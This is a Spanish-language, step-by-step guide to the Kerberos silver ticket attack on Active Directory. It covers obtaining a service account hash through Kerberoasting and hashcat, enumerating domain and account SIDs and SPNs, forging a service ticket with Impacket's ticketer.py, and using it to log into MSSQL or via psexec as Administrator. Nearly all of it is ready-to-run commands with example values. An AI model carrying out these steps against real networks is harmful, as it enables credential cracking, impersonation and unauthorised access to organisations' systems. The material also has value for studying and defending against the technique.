# Ataque Silver Ticket

Un ataque de *silver ticket* consiste en forjar un ticket de servicio Kerberos para obtener acceso no autorizado a un servicio específico en un servidor. A diferencia de un *golden ticket*, que permite acceso a cualquier recurso del dominio, el *silver ticket* se enfoca en un servicio concreto (por ejemplo, MSSQL) y puede usarse para hacerse pasar por un administrador u otra cuenta privilegiada en ese servicio.

## Requisitos

Para realizar un ataque de *silver ticket*, necesitas lo siguiente:

- **Hash NTLM de la cuenta de servicio**: El hash de la cuenta asociada al servicio objetivo (por ejemplo, la cuenta de servicio de MSSQL).
- **SID del dominio**: El identificador de seguridad (SID) del dominio de Active Directory.
- **SID de la cuenta de servicio**: El SID de la cuenta de servicio.
- **Nombre del servicio**: El nombre del servicio principal de Kerberos (SPN) del servicio objetivo (por ejemplo, MSSQLSvc).
- **Nombre del dominio**: El nombre de dominio completo (FQDN) de Active Directory.
- **Nombre del servidor**: El FQDN del servidor que aloja el servicio.

### Comandos para Obtener la Información Requerida (Sin Permisos de Administrador)

1. **Obtener el hash NTLM de la cuenta de servicio**:
   - Sin permisos de administrador, puedes intentar obtener el hash NTLM de la cuenta de servicio mediante técnicas como:
     - **Kerberoasting**: Solicita tickets de servicio (TGS) para cuentas con SPN y extrae el hash.
       ```bash
       GetUserSPNs.py -dc-ip <DC_IP> <DOMINIO>/<USUARIO>:<CONTRASEÑA> -request
       ```
       - Esto devuelve tickets cifrados que puedes crackear con herramientas como `hashcat` para obtener el hash NTLM.
       - Ejemplo:
         ```bash
         GetUserSPNs.py -dc-ip 192.168.1.10 example.com/usuario:contraseña -request
         ```
       - Usa `hashcat` para crackear el hash:
         ```bash
         hashcat -m 13100 <TGS_HASH> /ruta/a/wordlist.txt
         ```

2. **Obtener el SID del dominio**:
   - Usa `ldapsearch` o herramientas de enumeración como `rpcclient` con credenciales de usuario estándar.
     ```bash
     rpcclient -U "<DOMINIO>/<USUARIO>%<CONTRASEÑA>" <DC_IP>
     rpcclient> lookupnames <NOMBRE_DOMINIO>
     ```
     - El SID del dominio tiene el formato `S-1-5-21-<números_específicos_del_dominio>`.
     - Alternativamente, con PowerShell (si tienes acceso):
       ```powershell
       [System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid
       ```

3. **Obtener el SID de la cuenta de servicio**:
   - Usa `rpcclient` para enumerar el SID de la cuenta de servicio.
     ```bash
     rpcclient -U "<DOMINIO>/<USUARIO>%<CONTRASEÑA>" <DC_IP>
     rpcclient> lookupnames <NOMBRE_CUENTA_SERVICIO>
     ```
     - El SID de la cuenta de servicio es el SID del dominio más un identificador relativo (RID), por ejemplo, `S-1-5-21-<números_específicos_del_dominio>-<RID>`.
     - Alternativamente, con PowerShell:
       ```powershell
       Get-ADUser -Identity <NOMBRE_CUENTA_SERVICIO> -Server <DC_FQDN> | Select-Object SID
       ```

4. **Identificar el nombre del servicio**:
   - Enumera los SPN del servicio objetivo con `setspn` o consultas LDAP.
     ```bash
     setspn -T <DOMINIO> -Q */*
     ```
     - Busca el SPN, por ejemplo, `MSSQLSvc/<SERVIDOR_FQDN>:<PUERTO>` para MSSQL.
     - Con PowerShell:
       ```powershell
       Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | Where-Object { $_.ServicePrincipalName -like "*<SERVICIO>*" }
       ```

5. **Nombre del dominio**:
   - Es el FQDN del dominio, por ejemplo, `example.com`. Esto suele obtenerse durante la enumeración inicial.

6. **Nombre del servidor**:
   - El FQDN del servidor que aloja el servicio, por ejemplo, `sqlserver.example.com`. Se obtiene del SPN o mediante enumeración de red.

## Forjar el Silver Ticket con Impacket

1. **Crear el Silver Ticket**:
   - Usa `ticketer.py` de Impacket para forjar el ticket Kerberos.
     ```bash
     python3 ticketer.py -nthash <NTLM_HASH> -domain-sid <SID_DOMINIO> -domain <NOMBRE_DOMINIO> -spn <NOMBRE_SERVICIO> -user-id <RID_CUENTA_SERVICIO> <USUARIO_OBJETIVO>
     ```
     - Parámetros:
       - `-nthash`: El hash NTLM de la cuenta de servicio.
       - `-domain-sid`: El SID del dominio (sin el RID).
       - `-domain`: El FQDN del dominio (por ejemplo, `example.com`).
       - `-spn`: El nombre del servicio principal (por ejemplo, `MSSQLSvc/sqlserver.example.com:1433`).
       - `-user-id`: El RID de la cuenta de servicio (la última parte del SID de la cuenta).
       - `<USUARIO_OBJETIVO>`: El usuario a impersonar (por ejemplo, `Administrator`).
     - Ejemplo:
       ```bash
       python3 ticketer.py -nthash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-123456789-987654321-123456789 -domain example.com -spn MSSQLSvc/sqlserver.example.com:1433 -user-id 1105 Administrator
       ```
     - Esto genera un archivo `.ccache` con el ticket forjado.

2. **Configurar la variable de entorno para el ticket Kerberos**:
   - Exporta el ticket para usarlo con otras herramientas de Impacket.
     ```bash
     export KRB5CCNAME=/ruta/al/ticket.ccache
     ```

3. **Realizar Pass-the-Ticket (PTT)**:
   - Usa una herramienta de Impacket como `mssqlclient.py`, `psexec.py` o `smbexec.py` para acceder al servicio objetivo con el ticket forjado.
     - Ejemplo para MSSQL:
       ```bash
       python3 mssqlclient.py -k <DOMINIO>/<USUARIO_OBJETIVO>@<SERVIDOR_FQDN> -dc-ip <DC_IP>
       ```
       - `-k`: Indica autenticación Kerberos usando el ticket en `KRB5CCNAME`.
       - Ejemplo:
         ```bash
         python3 mssqlclient.py -k example/Administrator@sqlserver.example.com -dc-ip 192.168.1.10
         ```
       - Esto conecta al servicio MSSQL como el usuario impersonado (por ejemplo, `Administrator`).

## Notas
- Asegúrate de que el reloj del sistema esté sincronizado con el controlador de dominio para evitar problemas con los tickets Kerberos.
    - Comando: `sudo ntpdate -u <IP_DC>` 
- El ticket forjado solo es válido para el servicio y servidor especificados.
- Prueba el ticket con herramientas como `mssqlclient.py` para MSSQL o con otras herramientas de Impacket para diferentes servicios (por ejemplo, `psexec.py` para CIFS).
- Si el ticket falla, verifica la precisión del SPN, el hash y los SIDs.
- Sin permisos de administrador, el éxito del ataque depende de obtener el hash NTLM mediante técnicas como *Kerberoasting*.